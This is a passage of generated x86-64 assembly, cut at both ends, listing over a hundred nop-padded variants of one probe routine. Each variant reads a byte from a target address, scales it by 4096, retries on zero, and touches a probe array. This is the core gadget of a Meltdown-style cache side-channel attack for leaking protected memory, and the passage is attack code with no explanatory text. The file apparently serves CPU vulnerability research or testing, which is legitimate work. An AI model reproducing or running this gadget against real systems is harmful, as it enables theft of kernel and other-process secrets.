	jmp	.Lprobe_one_win0_continue
## Variant 193
.Lprobe_one_win0_var193:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 194
.Lprobe_one_win0_var194:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 195
.Lprobe_one_win0_var195:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 196
.Lprobe_one_win0_var196:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 197
.Lprobe_one_win0_var197:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 198
.Lprobe_one_win0_var198:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 199
.Lprobe_one_win0_var199:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 200
.Lprobe_one_win0_var200:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 201
.Lprobe_one_win0_var201:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 202
.Lprobe_one_win0_var202:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 203
.Lprobe_one_win0_var203:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 204
.Lprobe_one_win0_var204:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 205
.Lprobe_one_win0_var205:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 206
.Lprobe_one_win0_var206:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 207
.Lprobe_one_win0_var207:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 208
.Lprobe_one_win0_var208:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 209
.Lprobe_one_win0_var209:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 210
.Lprobe_one_win0_var210:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 211
.Lprobe_one_win0_var211:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 212
.Lprobe_one_win0_var212:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 213
.Lprobe_one_win0_var213:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 214
.Lprobe_one_win0_var214:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 215
.Lprobe_one_win0_var215:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 216
.Lprobe_one_win0_var216:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 217
.Lprobe_one_win0_var217:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 218
.Lprobe_one_win0_var218:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 219
.Lprobe_one_win0_var219:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 220
.Lprobe_one_win0_var220:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 221
.Lprobe_one_win0_var221:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 222
.Lprobe_one_win0_var222:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 223
.Lprobe_one_win0_var223:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 224
.Lprobe_one_win0_var224:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 225
.Lprobe_one_win0_var225:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 226
.Lprobe_one_win0_var226:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 227
.Lprobe_one_win0_var227:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 228
.Lprobe_one_win0_var228:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 229
.Lprobe_one_win0_var229:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 230
.Lprobe_one_win0_var230:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 231
.Lprobe_one_win0_var231:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 232
.Lprobe_one_win0_var232:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 233
.Lprobe_one_win0_var233:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 234
.Lprobe_one_win0_var234:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 235
.Lprobe_one_win0_var235:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 236
.Lprobe_one_win0_var236:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 237
.Lprobe_one_win0_var237:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 238
.Lprobe_one_win0_var238:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 239
.Lprobe_one_win0_var239:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 240
.Lprobe_one_win0_var240:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 241
.Lprobe_one_win0_var241:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 242
.Lprobe_one_win0_var242:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 243
.Lprobe_one_win0_var243:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 244
.Lprobe_one_win0_var244:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 245
.Lprobe_one_win0_var245:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 246
.Lprobe_one_win0_var246:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 247
.Lprobe_one_win0_var247:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 248
.Lprobe_one_win0_var248:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 249
.Lprobe_one_win0_var249:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 250
.Lprobe_one_win0_var250:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 251
.Lprobe_one_win0_var251:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 252
.Lprobe_one_win0_var252:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 253
.Lprobe_one_win0_var253:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 254
.Lprobe_one_win0_var254:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 255
.Lprobe_one_win0_var255:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 256
.Lprobe_one_win0_var256:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 257
.Lprobe_one_win0_var257:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 258
.Lprobe_one_win0_var258:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 259
.Lprobe_one_win0_var259:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 260
.Lprobe_one_win0_var260:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 261
.Lprobe_one_win0_var261:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 262
.Lprobe_one_win0_var262:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 263
.Lprobe_one_win0_var263:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 264
.Lprobe_one_win0_var264:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 265
.Lprobe_one_win0_var265:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 266
.Lprobe_one_win0_var266:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 267
.Lprobe_one_win0_var267:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 268
.Lprobe_one_win0_var268:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 269
.Lprobe_one_win0_var269:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 270
.Lprobe_one_win0_var270:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 271
.Lprobe_one_win0_var271:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 272
.Lprobe_one_win0_var272:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 273
.Lprobe_one_win0_var273:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 274
.Lprobe_one_win0_var274:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 275
.Lprobe_one_win0_var275:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 276
.Lprobe_one_win0_var276:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 277
.Lprobe_one_win0_var277:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 278
.Lprobe_one_win0_var278:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 279
.Lprobe_one_win0_var279:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 280
.Lprobe_one_win0_var280:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 281
.Lprobe_one_win0_var281:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 282
.Lprobe_one_win0_var282:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 283
.Lprobe_one_win0_var283:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 284
.Lprobe_one_win0_var284:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 285
.Lprobe_one_win0_var285:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 286
.Lprobe_one_win0_var286:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 287
.Lprobe_one_win0_var287:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 288
.Lprobe_one_win0_var288:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 289
.Lprobe_one_win0_var289:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 290
.Lprobe_one_win0_var290:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 291
.Lprobe_one_win0_var291:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 292
.Lprobe_one_win0_var292:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 293
.Lprobe_one_win0_var293:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 294
.Lprobe_one_win0_var294:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 295
.Lprobe_one_win0_var295:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 296
.Lprobe_one_win0_var296:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 297
.Lprobe_one_win0_var297:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
